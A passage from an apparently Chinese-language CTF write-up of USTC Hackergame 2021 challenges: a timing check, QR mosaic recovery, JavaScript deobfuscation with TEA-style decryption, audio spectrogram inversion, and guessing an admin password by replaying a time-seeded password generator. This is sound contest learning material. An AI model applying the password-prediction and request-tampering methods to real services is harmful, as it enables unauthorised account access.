Phrase . create ( this . mnemonics , text , token )) ? 1 : 0 ; // \u8fd9\u91cc\u4f1a sleep } var after = System . nanoTime (); var duration = TimeUnit . MILLISECONDS . convert ( after - before , TimeUnit . NANOSECONDS ); if ( duration > FLAG1_DURATION_MILLIS ) { // 600ms token . addFlag ( 1 , flag -> output . put ( \"flag1\" , flag )); } \u800c\u5728\u7f51\u9875\u4e2d\u6dfb\u52a0\u6761\u76ee\u7684\u65f6\u5019\uff0c\u4e00\u6b21\u53ea\u80fd\u6dfb\u52a0\u4e00\u6761\uff0c\u4e5f\u5c31\u662f\u4e00\u4e2a POST \u91cc\u9762\u53ea\u6709\u4e00\u4e2a Phrase \u4f46\u662f\u6e90\u7801\u4e2d\u6709\u4e00\u4e2a\u5faa\u73af\uff0c\u904d\u5386\u6574\u4e2a input\uff0c\u6240\u4ee5\u4e00\u4e2a POST \u91cc\u7684\u5185\u5bb9\u5176\u5b9e\u662f\u4e00\u4e2a\u5217\u8868 \u6240\u4ee5\u53ef\u4ee5\u7528 BurpSuite \u83b7\u53d6 POST \u7136\u540e\u66f4\u6539\u4e00\u4e0b\u5185\u5bb9\u518d\u53d1\u9001\u51fa\u53bb\uff08\u5148 random \u4e00\u4e2a\uff0c\u7136\u540e add\uff09 \u6839\u636e flag \u91cc\u7684\u63d0\u793a\uff0c\u6b63\u89e3\uff08\u7b2c\u4e8c\u987f\u5927\u9910\uff09\u5e94\u8be5\u662f\u4f7f\u7528\u54c8\u5e0c\u78b0\u649e\uff0c \u4f46\u662f\u4e0d\u4f1a \u9a6c\u8d5b\u514b \u00b6 \uff08\u8fd9\u9053\u9898\u5df2\u7ecf\u505a\u7834\u9632\u4e86\uff0c\u672c\u4ee5\u4e3a\u662f\u4e2a\u9752\u94dc\uff0c\u7ed3\u679c\u662f\u4e2a\u738b\u8005\u2026\u2026\uff09 \u6211\u505a\u7684\u80af\u5b9a\u4e0d\u662f\u6b63\u89e3\uff0c\u5229\u7528\u4e8c\u7ef4\u7801\u7ea0\u9519\u80fd\u529b\u52c9\u5f3a\u62ff\u5230\u4e86 flag\uff0c\u6240\u4ee5\u5c31\u4e0d\u8be6\u7ec6\u5199 writeup \u4e86\uff0c\u4e3b\u8981\u8fd8\u662f\u8981\u770b\u5b98\u65b9 wp\uff08\u9003 \u5927\u6982\u6b65\u9aa4\u5c31\u662f\uff1a \u8bfb\u56fe\u7247 \u628a\u5df2\u77e5\u7684\u50cf\u7d20\u63d0\u53d6\u51fa\u6765 \u628a\u56db\u4e2a\u5c0f\u5b9a\u4f4d\u5757\u586b\u4e0a \u6328\u4e2a\u9a6c\u8d5b\u514b\u5757\u5bfb\u627e\u4f7f\u8fd8\u539f\u7684\u6570\u636e\u5e73\u5747\u6570\u4e0e\u539f\u9a6c\u8d5b\u514b\u503c\u5dee\u7684\u7edd\u5bf9\u503c\u5c0f\u4e8e1\u7684\u586b\u8865\u65b9\u6cd5 \u5982\u679c\u53ea\u6709\u4e00\u79cd\u5c31\u586b\u4e0a\uff0c\u5e76\u4e14\u6807\u6ce8\u5df2\u7ecf\u586b\u597d\uff0c\u4ee5\u540e\u4e0d\u518d\u641c\u5bfb \u5982\u679c\u6709\u591a\u79cd\u5c31\u5148\u653e\u4e0b\u4e0d\u586b \u91cd\u590d4\u7684\u8fc7\u7a0b\uff0c\u8fd9\u662f\u8fd8\u4f1a\u6709\u552f\u4e00\u786e\u5b9a\u7684\u586b\u8865\u65b9\u6848\u3002\u91cd\u590d4\u6b21\u5927\u6982\u5c31\u4e0d\u5269\u552f\u4e00\u89e3\u4e86 \u8fd9\u65f6\u91cd\u590d4\uff0c\u627e\u51fa\u4ec5\u67092\u4e2d\u586b\u8865\u65b9\u6cd5\u7684\uff0c\u9009\u8bef\u5dee\u6700\u5c0f\u7684\u586b\u4e0a \u7136\u540e\u518d\u91cd\u590d4 \u7136\u540e\u91cd\u590d6 \u7136\u540e\u91cd\u590d4 \u8fd9\u65f6\u53ef\u4ee5\u770b\u5230\u5df2\u7ecf\u8fd8\u539f\u5f97\u5dee\u4e0d\u591a\u4e86\uff0c\u5269\u4e0b\u7684\u4e0d\u7ba1\u76f4\u63a5\u626b\u7801\u4e5f\u53ef\u4ee5\u626b\u51fa flag \u4e86 \u770b\uff0c\u505a\u6cd5\u5f88\u70c2\u5bf9\u5427 minecRaft \u00b6 kk \u540c\u5b66\u5f88\u559c\u6b22\u73a9 Minecraft\uff0c\u4ed6\u6700\u8fd1\u6536\u5230\u4e86\u4e00\u5f20 MC \u5730\u56fe\uff0c\u5730\u56fe\u91cc\u9762\u6709\u4e09\u76cf\u706f\uff0c\u8fd8\u6709\u5f88\u591a\u5947\u5947\u602a\u602a\u7684\u538b\u529b\u677f\u3002 \u4f46\u4ed6\u53d1\u73b0\u8fd9\u4e9b\u706f\u597d\u50cf\u4e0d\u592a\u7b26\u5408 MC \u7535\u78c1\u5b66\uff08Red stone\uff09\uff0c\u4f60\u80fd\u5e2e\u4ed6\u628a\u706f\u5168\u90e8\u70b9\u4eae\u5417\uff1f \u6ce8\uff1a\u672c\u9898\u89e3\u6cd5\u4e0e\u539f\u7248 Minecraft \u6e38\u620f\u65e0\u5173\u3002 \u8865\u5145\u8bf4\u660e\uff1aflag \u82b1\u62ec\u53f7\u5185\u4e3a\u8ba9\u4e09\u76cf\u706f\u5168\u90e8\u70b9\u4eae\u7684\u6700\u77ed\u7684\u8f93\u5165\u5e8f\u5217\u3002\u4f8b\u5982\uff0c\u5982\u679c\u8e29\u8e0f\u538b\u529b\u677f\u8f93\u5165\u7684\u6700\u77ed\u7684\u5e8f\u5217\u4e3a abc\uff0c\u5219\u7b54\u6848\u4e3a flag{abc}\u3002 \u8fd8\u633a\u597d\u73a9\u7684\u9898\uff0c\u5728\u7f51\u9875\u4e2d\u6a21\u62df\u4e86\u4e00\u4e2amc\u51fa\u6765 \u770b\u6e90\u7801\u770b\u5230\u4e86\u5f15\u5165\u4e86 flag.js \u6587\u4ef6\uff0c\u6240\u4ee5\u53ef\u80fd\u5c31\u662f\u8981\u901a\u8fc7\u5b83\u6765\u5f97\u5230\u7b54\u6848\uff1a < script src = \"jsm/miscs/flag.js\" ></ script > \u4e5f\u53ef\u4ee5\u770b\u5230\uff0c\u6700\u7ec8\u5224\u65ad\u662f\u5426\u6b63\u786e\u662f\u901a\u8fc7\u8c03\u7528 gyflagh(input) \u662f\u5426\u4e3a true \u6765\u5224\u65ad\uff0c\u800c gyflagh \u4e5f\u5728 flag.js \u4e2d\uff0c\u6240\u4ee5\u8fd8\u662f\u8981\u770b flag.js \u4f46\u662f flag.js \u662f\u7ecf\u8fc7\u7b80\u5355\u6df7\u6dc6\u8fc7\u7684\uff0c\u8fd8\u662f\u8981\u8d39\u70b9\u65f6\u95f4\u8bfb\u4e00\u4e0b \u5176\u4e2d\u6709\u56db\u4e2a\u8f6c\u6362 Str4 Base16 \u548c Long \u7684\u51fd\u6570\u53ef\u4ee5\u7565\u6389\u4e0d\u7ba1 \u6ce8\u610f\u5230\u4e86 _0x381b() \u8fd9\u4e2a\u51fd\u6570\u91cc\u6709\u4e00\u4e2a\u5217\u8868\uff0c\u800c\u4e14\u6bd4\u8f83\u7b80\u5355\uff0c\u5176\u5b9e\u5b83\u8fd4\u56de\u7684\u5c31\u662f\u8fd9\u4e2a\u5217\u8868 ['encrypt', '33MGcQht', '6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c', '14021KbbewD', 'charCodeAt', '808heYYJt', '5DlyrGX', '552oZzIQH', 'fromCharCode', '356IjESGA', '784713mdLTBv', '2529060PvKScd', '805548mjjthm', '844848vFCypf', '4bIkkcJ', '1356853149054377', 'length', 'slice', '1720848ZSQDkr'] \u4f46\u662f\u5728 Console \u91cc\u9762\u8c03\u7528 _0x381b \u5f97\u5230\u7684\u5374\u662f\u4ee5 'slice' \u5f00\u5934\u3001'length' \u7ed3\u5c3e\u7684\u5217\u8868\uff0c\u5c06\u8fd9\u4e2a\u5217\u8868\u8bb0\u4e3a lst \u65b9\u4fbf\u8868\u8ff0 \u800c\u4e14\u6e90\u7801\u4e2d\u53ea\u6709\u6700\u5f00\u5934\u7684\u8c03\u7528\u533f\u540d\u51fd\u6570\u91cc\u9762\u6709 ['push'] \u548c ['shift'] \uff0c\u6240\u4ee5\u63a8\u6d4b\u8fd9\u4e2a\u533f\u540d\u51fd\u6570\u5c31\u662f\u5c06\u8fd9\u4e2a\u5217\u8868\u5faa\u73af\u53f3\u79fb\u4e24\u4e2a\u4f4d\u7f6e \u90a3\u8fd9\u4e2a\u533f\u540d\u51fd\u6570\u4e5f\u4e0d\u7528\u770b\u4e86 \u518d\u6765\u770b _0x2c9e() \u8fd9\u4e2a\u51fd\u6570\uff1a function _0x2c9e ( _0x49e6ff , _0x310d40 ) { const _0x381b4c = _0x381b (); return _0x2c9e = function ( _0x2c9ec6 , _0x2ec3bd ) { _0x2c9ec6 = _0x2c9ec6 - 0x1a6 ; let _0x4769df = _0x381b4c [ _0x2c9ec6 ]; return _0x4769df ; } , _0x2c9e ( _0x49e6ff , _0x310d40 ); } \u5176\u4e2d _0x381b4c \u662f\u521a\u521a\u8bf4\u7684\u90a3\u4e2a\u5217\u8868 lst\u3002\u7136\u540e return \u91cc\u9762\u91cd\u65b0\u5b9a\u4e49\u4e86 _0x2c9e \uff0c\u4f46\u662f\u65b0\u7684\u5b9a\u4e49\u91cc\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5e76\u6ca1\u6709\u7528\uff0c\u7136\u540e\u8c03\u7528\u8fd4\u56de\uff0c\u6240\u4ee5\u6574\u4e2a\u51fd\u6570\u5c31\u76f8\u5f53\u4e8e\uff1a function _0x2c9e ( _0x2c9ec6 , ...) { _0x2c9ec6 = _0x2c9ec6 - 0x1a6 ; return lst [ _0x2c9ec6 ]; } 0x1a6 \u662f 422\uff0c\u6240\u4ee5\u6574\u4e2a\u51fd\u6570\u4e5f\u5c31\u76f8\u5f53\u4e8e function(x) { return lst[x - 422]; } \u540c\u65f6\u6839\u636e\u7b2c\u4e00\u884c\uff0c\u7a0b\u5e8f\u4e2d\u6240\u6709 _0x22517d \u4e5f\u662f\u8fd9\u4e2a\u51fd\u6570 \u7136\u540e\u770b\u5224\u65ad\u7b54\u6848\u7684 gyflagh \u51fd\u6570 function gyflagh ( _0x111955 ) { const _0x50051f = _0x22517d ; let _0x3b790d = _0x111955 [ _0x50051f ( 0x1a8 )]( _0x50051f ( 0x1b7 )); if ( _0x3b790d === _0x50051f ( 0x1aa )) return !! []; return ! []; } \u6ca1\u5565\u7279\u522b\u7684\uff0c\u7ed3\u5408 lst \u53ef\u4ee5\u5f97\u5230\uff1a function gyflagh ( ans ) { if ( ans [ \"encrypt\" ]( \"1356853149054377\" ) === \"6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c\" ) { return true ; } return false ; } \u7136\u540e\u5c31\u53ef\u4ee5\u7ed3\u5408 lst \u4e2d\u7684\u503c\u548c\u7d22\u5f15\uff0c\u7ffb\u8bd1\u51fa\u6700\u91cd\u8981\u7684\u51fd\u6570 \u518d\u8fdb\u884c\u4e00\u4e9b\u8fd0\u7b97\uff0c\u7528\u6ce8\u91ca\u6807\u6ce8\u4e00\u4e0b\u5df2\u77e5\u7684\u503c\u5c31\u53ef\u4ee5\u5f97\u5230\uff1a String [ \"prototype\" ][ \"encrypt\" ] = function ( key ) { // key = \"1356853149054377\" const left = new Array ( 2 ); const right = new Array ( 4 ); let res = \"\" ; ans = escape ( this ); // this := ans right = [ 909456177 , 825439544 , 892352820 , 926364468 ] for ( var i = 0 ; i < ans [ \"length\" ]; i = i + 8 ) { left [ 0 ] = Str4ToLong ( ans [ \"slice\" ]( i , i + 4 )); left [ 1 ] = Str4ToLong ( ans [ \"slice\" ]( i + 4 , i + 8 )); code ( left , right ); res = res + ( LongToBase16 ( left [ 0 ]) + LongToBase16 ( left [ 1 ])); } return res ; // 6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c }; \u518d\u6765\u770b code \u51fd\u6570\uff0c\u6839\u636e << 4\u3001 ^\u3001 >>> 5 \u53ef\u4ee5\u5927\u80c6\u63a8\u6d4b\u7c7b\u4f3c TEA\uff0c\u7136\u540e\u89e3\u7801\u5c31\u76f4\u63a5\u7ffb\u8fc7\u6765\u5c31\u597d\u4e86\uff1a function dec ( left , right ) { for ( var i = 2654435769 * 32 ; i != 0 ;) { left [ 1 ] -= (( left [ 0 ] << 4 ^ left [ 0 ] >>> 5 ) + left [ 0 ] ^ i + right [ i >>> 11 & 3 ]); i -= 2654435769 ; left [ 0 ] -= (( left [ 1 ] << 4 ^ left [ 1 ] >>> 5 ) + left [ 1 ] ^ i + right [ i & 3 ]); } console . log ( left ); } \u6700\u540e\u628a\u8981\u5f97\u5230\u7684 res \u5206\u5757\uff0c\u6bcf 8 \u4e2a\u4e00\u7ec4\uff1a 6fbde674 819a59bf a1209256 5b4ca2a7 a11dc670 c678681d af4afb67 04b82f0c \u7136\u540e\u4ece\u540e\u5f80\u524d\uff0c\u6bcf\u4e24\u4e2a\u6267\u884c Base16ToLong\uff0c\u7136\u540e\u4f5c\u4e3a left \u4f20\u7ed9 dec \u51fd\u6570\u89e3\u7801\uff0c\u7136\u540e\u518d LongToStr4 \u5f97\u5230\u56db\u4e2a\u5b57\u7b26: \u62fc\u8d77\u6765\u5c31\u662f flag \u4e86\uff1a flag{McWebRE_inMlnCrA1t_3a5y_1cIuop9i} \u5bc6\u7801\u751f\u6210\u5668 \u00b6 \u5c0f T \u6700\u8fd1\u53c8\u5199\u4e86\u4e00\u4e2a web \u5e94\u7528\u3002 \u4ed6\u53d1\u73b0\u5f88\u591a\u7528\u6237\u90fd\u559c\u6b22\u8bbe\u7f6e\u5f31\u5bc6\u7801\uff0c\u4e8e\u662f\u51b3\u5b9a\u8ba9\u6240\u6709\u7528\u6237\u7684\u5bc6\u7801\u90fd\u5fc5\u987b\u662f 16 \u4f4d\u957f\uff0c\u5e76\u4e14\u5404\u79cd\u7b26\u53f7\u90fd\u8981\u6709\u3002\u4e3a\u4e86\u8ba9\u5927\u5bb6\u53ef\u4ee5\u65b9\u4fbf\u751f\u6210\u8fd9\u6837\u7684\u5bc6\u7801\uff0c\u4ed6\u8fd8\u5199\u4e86\u4e00\u4e2a\u5bc6\u7801\u751f\u6210\u5668\uff0c\u8ba9\u7528\u6237\u53ef\u4ee5\u751f\u6210\u7b26\u5408\u89c4\u5219\u7684\u5bc6\u7801\u3002 \u4f46\u8fd9\u6837\u679c\u771f\u5b89\u5168\u5417\uff1f \uff08\u611f\u89c9\u8fd9\u6b21 Hackergame \u9898\u7684 tag \u90fd\u5f88\u8be1\u5f02\u3002\u8fd9\u9898\u660e\u660e\u662f misc(general) \u4e3a\u4ec0\u4e48\u6253\u4e86 binary \u7684 tag\uff09 \u770b\u5230 binary tag \u76f4\u63a5\u5148\u5f80 IDA \u91cc\u9762\u4e22\uff0c\u7136\u540e\u62a5\u9519\u4e86\uff0c\u5927\u6982\u662f\u56e0\u4e3a\u90e8\u5206 winapi \u5bfc\u5165\u4e0d\u8fdb\u53bb\u7684\u95ee\u9898\uff08\uff1f\uff09 \u7136\u540e\u5c31\u4e0d\u4f1a\u4e86\u2026\u2026 \u5bf9\u7740 IDA \u5e72\u77aa\u773c \u770b\u9898\uff0c\u9898\u76ee\u7ed9\u4e86\u4e00\u4e2a\u7f51\u7ad9\uff0c\u7528\u6765\u53d1\u5e03\u5c55\u677f\uff0c\u770b\u8d77\u6765\u53ea\u6709 admin \u7528\u6237\uff0c\u800c\u4e14\u6ca1\u6709\u6ce8\u518c\u7cfb\u7edf\uff0c\u6240\u4ee5\u5e94\u8be5\u5c31\u662f\u8981\u641e\u5230 admin \u7684\u5bc6\u7801\u4e86 \u518d\u7ec6\u770b\u7f51\u7ad9\uff0c\u7279\u610f\u63d0\u5230 \u201c\u7f51\u9875\u663e\u793a \u65f6\u95f4 \u201d\uff0c\u800c\u4e14\u5c55\u677f\u540e\u9762\u90fd\u6709\u53d1\u5e03\u65f6\u95f4\uff0c\u70b9\u8fdb admin \u7684\u7528\u6237\u9875\u9762\u53d1\u73b0\u4e5f\u6709\u6ce8\u518c\u65f6\u95f4\uff0c\u7740\u5b9e\u6709\u4e9b\u8bb8\u8be1\u5f02\uff08 \u6240\u4ee5\u65f6\u95f4\u5e94\u8be5\u662f\u4e00\u4e2a\u63d0\u793a \u800c\u5199\u4ee3\u7801\u7684\u65f6\u5019\u8bbe\u7f6e\u968f\u673a\u6570\u79cd\u5b50\u53c8\u5e38\u4ee5\u5f53\u524d\u65f6\u95f4\u4f5c\u4e3a\u79cd\u5b50\uff0c\u6240\u4ee5\u751f\u6210\u7684\u5bc6\u7801\u53ef\u80fd\u662f\u548c\u65f6\u95f4\u6709\u5173\u7cfb\u7684 \u901a\u8fc7\u8c03\u7cfb\u7edf\u65f6\u95f4\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u540c\u4e00\u79d2\u70b9\u4e0b\u751f\u6210\uff0c\u4ea7\u751f\u7684\u5bc6\u7801\u662f\u4e00\u6837\u7684 \u6240\u4ee5\u53ea\u9700\u8981\u628a\u7cfb\u7edf\u65f6\u95f4\u8c03\u5230 admin \u7684\u6ce8\u518c\u65f6\u95f4\u5de6\u53f3\uff0c\u7136\u540e\u6bcf\u79d2\u751f\u6210\u5bc6\u7801\uff0c\u518d\u6328\u4e2a\u8f93\u8fdb\u53bb\u7206\u7834\u5373\u53ef \u6700\u540e\u5f97\u5230 2021-09-22 23:10:53 \u65f6\u751f\u6210\u7684\u5bc6\u7801 $Z=CBDL7TjHu~mEX \u5c31\u662f admin \u7684\u5bc6\u7801 \u7136\u540e\u767b\u5f55\u5373\u53ef\u5728\u201c\u6211\u7684\u201d\u91cc\u770b\u5230\u4e00\u6761\u79c1\u5bc6\u5c55\u677f\uff0c\u5185\u5bb9\u662f flag p\ud83d\ude2dq \u00b6 \u5b66\u4f1a\u5085\u91cc\u53f6\u7684\u4e00\u77ac\u95f4\uff0c\u6094\u6068\u7684\u6cea\u6c34\u6d41\u4e86\u4e0b\u6765\u3002 \u5f53\u6211\u770b\u5230\u97f3\u9891\u64ad\u653e\u5668\u4e2d\u8df3\u52a8\u7684\u9891\u8c31\u52a8\u753b\uff0c\u6708\u660e\u661f\u7a00\u7684\u591c\u665a\uff0c\u6df1\u9083\u7684\u94f6\u6cb3\uff0c\u53ea\u6709\u5929\u4f7f\u5728\u6d45\u541f\u4f4e\u5531\uff0c\u590d\u6742\u7684\u60c5\u611f\u4e8e\u6211\u773c\u4e2d\u6ea2\u51fa\uff0c\u50cf\u662f\u6c89\u5165\u4e86\u96fe\u91cc\u6726\u80e7\u7684\u6d77\u4e00\u6837\u7684\u6e29\u67d4\u3002 \u8fd9\u4e00\u523b\u6211\u624d\u77e5\u9053\uff0c\u8033\u673a\u97f3\u54cd\u4e5f\u5c31\u56fe\u4e00\u4e50\uff0c\u771f\u542c\u97f3\u4e50\u8fd8\u5f97\u9760\u773c\u775b\u3002 \uff08\u6ce8\u610f\uff1aflag \u82b1\u62ec\u53f7\u5185\u662f\u4e00\u4e2a 12 \u4f4d\u6574\u6570\uff0c\u7531 0-9 \u6570\u4f4d\u7ec4\u6210\uff0c\u6ca1\u6709\u5176\u5b83\u5b57\u7b26\u3002\uff09 \u867d\u7136\u8fd9\u9898\u662f\u5728\u5012\u6570\u7b2c\u4e09\u9898\uff0c\u8fd8\u503c 400pt\uff0c \u4f46\u4f60\u4e00\u8bf4\u5085\u91cc\u53f6\u6211\u53ef\u5c31\u4e0d\u56f0\u4e86\u55f7 \u4e0b\u8f7d\u9898\u76ee\u5305\uff0c\u6709\u4e00\u4e2a\u751f\u6210 gif \u7684 py \u4ee3\u7801\u548c\u90a3\u4e2a gif \u6587\u4ef6 \u6b63\u597d\u524d\u9762\u7684\u7535\u6ce2\u4e5f\u6709\u4e00\u6bb5\u97f3\u9891\uff0c\u53ef\u4ee5\u7528\u90a3\u4e2a\u5e26\u5165\u5230 generate_sound_visualization.py \u4e2d\u751f\u6210\u4e00\u4e2a gif\uff0c\u7136\u540e\u7528\u8fd9\u4e2a\u6765\u6d4b\u8bd5 \u518d\u4ed4\u7ec6\u770b\u4e00\u770b generate_sound_visualization.py \u8fd9\u4e2a\u6587\u4ef6 \u4e3b\u8981\u4f7f\u7528\u4e86 librosa \uff0c\u4e8e\u662f\u5c31\u53ef\u4ee5\u7ffb \u6587\u6863 \u6765\u770b\u61c2\u8fd9\u4e2a\u7a0b\u5e8f\uff1a y , sample_rate = librosa . load ( \"flag.mp3\" ) # \u4ecemp3\u4e2d\u8bfb\u53d6\u6570\u636e\u548c\u91c7\u6837\u7387 spectrogram = numpy . around ( # \u56db\u820d\u4e94\u5165\uff0c\u4f46\u4f1a\u9020\u6210\u9006\u5411\u7684\u65f6\u5019\u6709\u5c11\u8bb8\u8bef\u5dee\u5bfc\u81f4\u6742\u97f3 librosa . power_to_db ( # \u628a\u4ee5\u529f\u7387\u4e3a\u5355\u4f4d\u7684\u9891\u8c31\u56fe\u8f6c\u6362\u4e3a\u4ee5\u5206\u8d1d\u4e3a\u5355\u4f4d librosa . feature . melspectrogram ( # \u901a\u8fc7\u97f3\u9891\u6570\u636e\u548c\u91c7\u6837\u7387\u8ba1\u7b97\u6885\u5c14\u9891\u8c31 y , sample_rate , n_mels = num_freqs , n_fft = fft_window_size , hop_length = frame_step_size , window = window_function_type ) ) / quantize # \u9664\u4ee52 ) * quantize # \u4e58\u4ee52 \u7136\u540e\u53c8\u901a\u8fc7\u4e00\u4e9b numpy \u7684\u9a9a\u64cd\u4f5c\u6765\u751f\u6210\u6bcf\u4e00\u5e27\u7684\u6570\u636e\uff0c\u7136\u540e\u901a\u8fc7 array2gif \u5305\u7684 write_gif \u51fd\u6570\u6765\u751f\u6210 gif \u6240\u4ee5\u4e3b\u8981\u601d\u8def\u5c31\u662f\u628a\u6574\u4e2a\u7a0b\u5e8f \u5b8c\u6574\u5730\u9006\u8fc7\u6765 \u7531\u4e8e\u5fc5\u5e94\u6ca1\u6709\u67e5\u5230 gif2array \u7684\u5305\uff0c\u6240\u4ee5\u8bfb\u53d6 gif \u5c31\u7528\u4e86\u7ecf\u5178 PIL.Image \uff1a from PIL import Image file = Image . open ( \"flag.gif\" ) try : while True : gif_data . append ( np . array ( file )) file . seek ( file . tell () + 1 ) except : print ( \"[+] Read gif file\" ) \u7136\u540e\u662f\u89e3\u51b3\u90a3\u4e00\u5927\u6bb5 numpy \u9a9a\u64cd\u4f5c\u7684\u9006\u9a9a\u64cd\u4f5c\uff08 \u4f46\u662f\u6570\u7406\u57fa\u7840\u8fd9\u4e48\u5dee\u7684\u6211\u5f53\u7136\u662f\u4e0d\u60f3\u4ed4\u7ec6\u7814\u7a76\u4e86\uff0c\u6240\u4ee5\u76f4\u63a5\u7528\u7535\u6ce2\u90a3\u9898\u7684 radio.mp3 \u5e26\u5165\uff0c\u770b\u4e00\u770b\u8981\u5f97\u5230\u7684 spectrogram \u662f\u4ec0\u4e48\u6837\u5b50 \u8f93\u51fa\u5f97\u5230\u7684 spectrogram \u662f\uff1a [[ - 58. - 48. - 30. ... - 58. - 58. - 58. ] [ - 58. - 44. - 26. ... - 58. - 58. - 58. ] [ - 58. - 40. - 16. ... - 58. - 58. - 58. ] ... [ - 58. - 42. - 30. ... - 58. - 58. - 58. ] [ - 58. - 44. - 32. ... - 58. - 58. - 58. ] [ - 58. - 46. - 34. ... - 58. - 58. - 58. ]] \u800c\u8f6c\u7f6e\u8fc7\u6765\u662f\uff1a [[ - 58. - 58. - 58. ... - 58. - 58. - 58. ] [ - 48. - 44. - 40. ... - 42. - 44. - 46. ] [ - 30. - 26. - 16. ... - 30. - 32. - 34. ] ... [ - 58. - 58. - 58. ... - 58. - 58. - 58. ] [ - 58. - 58. - 58. ... - 58. - 58. - 58. ] [ - 58. - 58. - 58. ... - 58. - 58. - 58. ]] \u51cf\u53bb min_db=-60 \u7b2c\u4e00\u884c\u6b63\u597d\u662f 2\uff0c\u7b2c\u4e8c\u884c\u662f [12. 16. 20. ... 18. 16. 14.] \u518d\u5bf9\u5e94\u5230\u751f\u6210\u7684 gif \u6587\u4ef6\u4e2d\uff0c\u53ef\u4ee5\u770b\u51fa gif \u7684\u7b2c\u4e00\u5e27\u6bcf\u4e2a\u77e9\u5f62\u7684\u9ad8\u5ea6\u90fd\u662f 2 \u800c\u7b2c\u4e8c\u5e27\u6bcf\u4e2a\u77e9\u5f62\u7684\u9ad8\u5ea6\u4e5f\u6070\u597d\u662f\u521a\u5f97\u51fa\u7684\u90a3\u7ec4\u6570 \u6240\u4ee5\u8981\u5f97\u5230\u7684 spectrogram \u5c31\u662f gif \u6bcf\u4e00\u5e27\u6240\u6709\u77e9\u5f62\u7684\u9ad8\u5ea6\u6784\u6210\u7684\u77e9\u9635\u7684\u8f6c\u7f6e \u518d\u7ed3\u5408\u6e90\u7801\uff1a numpy . array ([ [ red_pixel if freq % 2 and round ( frame [ freq // 2 ]) > threshold else white_pixel for threshold in list ( range ( min_db , max_db + 1 , quantize ))[:: - 1 ] ] for freq in range ( num_freqs * 2 + 1 ) ]) \u53ef\u4ee5\u770b\u51fa\uff0c\u6bcf\u4e2a\u77e9\u5f62\u52a0\u4e0a\u5de6\u8fb9\u7684\u7a7a\u683c\u6b63\u597d\u662f 4 \u4e2a\u50cf\u7d20\uff0c\u6240\u4ee5\u6bcf\u56db\u5217\u8bfb\u53d6\u6700\u540e\u4e00\u5217\u5373\u53ef\uff1a spectrogramT = [] for data in gif_data : res = [] for ind , line in enumerate ( data . transpose ()): # \u5c06\u6bcf\u4e00\u5e27\u8f6c\u7f6e\uff0c\u65b9\u4fbf\u8ba1\u7b97 num = sum ( line ) # \u8ba1\u7b97\u6bcf\u4e2a\u77e9\u5f62\u7684\u9ad8\u5ea6\uff08\u8f6c\u7f6e\u540e\u662f\u5bbd\u5ea6\uff09 if ind % 4 == 3 : res . append ( num + min_db ) # \u5f97\u5230\u7684\u6570\u8981\u52a0\u4e0a-60\u624d\u7b26\u5408\u89c4\u77e9 spectrogramT . append ( res ) spectrogram = np . array ( spectrogramT ) . transpose () # \u5f97\u5230\u7684\u7ed3\u679c\u8f6c\u7f6e\u4e00\u4e0b \u8fd9\u6837\u5c31\u5f97\u5230\u4e86\u6885\u5c14\u9891\u8c31\u56fe\u7684\u6570\u636e\uff0c\u53ef\u4ee5\u5bf9 librosa \u7684\u90e8\u5206\u8fdb\u884c\u9006\u8fc7\u7a0b\u4e86 \u7ffb librosa \u7684\u6587\u6863\uff0c\u6709 power_to_db \u5f53\u7136\u4e5f\u5c31\u6709 db_to_power \u800c\u4e14\u7c7b\u4f3c\u4e8e melspectrogram \u51fd\u6570\u5728 librosa.feature \u4e2d\uff0c\u53ef\u4ee5\u4e13\u95e8\u770b feature \u90e8\u5206\u7684\u6587\u6863 \u7ffb\u5230\u4e86 inverse \u90e8\u5206\uff0c\u53ef\u4ee5\u770b\u5230\u6709\u4e00\u4e2a\u51fd\u6570 librosa.feature.inverse.mel_to_audio \u53ef\u4ee5\u76f4\u63a5\u628a\u6885\u5c14\u9891\u8c31\u56fe\u4e13\u4e3a\u97f3\u9891\u6570\u636e\uff0c\u6240\u4ee5\u5c31\u7528\u5b83\u4e86\uff1a y = librosa . feature . inverse . mel_to_audio ( librosa . db_to_power ( spectrogram ), # \u4e58\u4e8c\u9664\u4e8c\u6ca1\u4ec0\u4e48\u5927\u7528\uff0c\u800c\u4e14\u5f71\u54cd\u6548\u679c\uff0c\u5c31\u5220\u4e86 sample_rate , n_iter = num_freqs , # \u91c7\u6837\u7387\u9898\u76ee\u63d0\u4f9b\u4e86\uff0c\u662f 22050Hz n_fft = fft_window_size , hop_length = frame_step_size , window = window_function_type , ) \u8fd9\u6837\u5c31\u5b8c\u6210\u4e86\u8fd8\u539f\uff0c\u6700\u540e\u662f\u8f93\u51fa\uff0c\u4f46\u662f\u5e76\u6ca1\u5728 librosa \u4e2d\u627e\u5230\u97f3\u9891\u8f93\u51fa\u7684\u51fd\u6570\uff0c\u6240\u4ee5\u5c31\u7528\u4e86\u7ecf\u5178 soundfile \uff1a import soundfile as sf sf . write ( \"flag.wav\" , y , sample_rate ) \u7136\u540e\u6253\u5f00\u542c\u5c31\u884c\u4e86\uff0c\u9898\u76ee\u8bf4\u4e86\u662f\u4e2a 12 \u4f4d\u6570\uff0c\u6240\u4ee5\u5269\u4e0b\u7684\u5c31\u662f\u82f1\u8bed\u542c\u529b\u4e86\uff0c\u7ffb\u8bd1\u8fc7\u6765\u7684\u6570\u5b57\u5c31\u662f flag \u4e86 Reference \u00b6 Hackergame \u56fd\u9645\u822a\u7a7a\u65e0\u7ebf\u7535\u901a\u8baf26\u4e2a\u82f1\u6587\u5b57\u6bcd\u8bfb\u6cd5 - \u77e5\u4e4e LUG@USTC \u5b98\u7f51 Wayback Machine archive.org SIGBOVIK 2021 \u767e\u5ea6\u5168\u666f\u5730\u56fe \u4f2a\u9020http\u8bf7\u6c42ip\u5730\u5740 - \u535a\u5ba2\u56ed GraphQL\u5b98\u7f51 \u3001 GraphiQL \u3001 GraphQL Voyager \u3010\u5b89\u5168\u8bb0\u5f55\u3011\u73a9\u8f6cGraphQL - DVGA\u9776\u573a\uff08\u4e0a\uff09- \u77e5\u4e4e librosa\u6587\u6863 PySoundFile\u6587\u6863 Wilson's theorem - wikipedia BUU-RSA [RoarCTF2019]babyRSA - CSDN Euler's totient function - wikipedia LUKS2 doc pdf 10 Linux cryptsetup Examples for LUKS Key Management pyinstxtractor uncompyle6","title":"USTC Hackergame 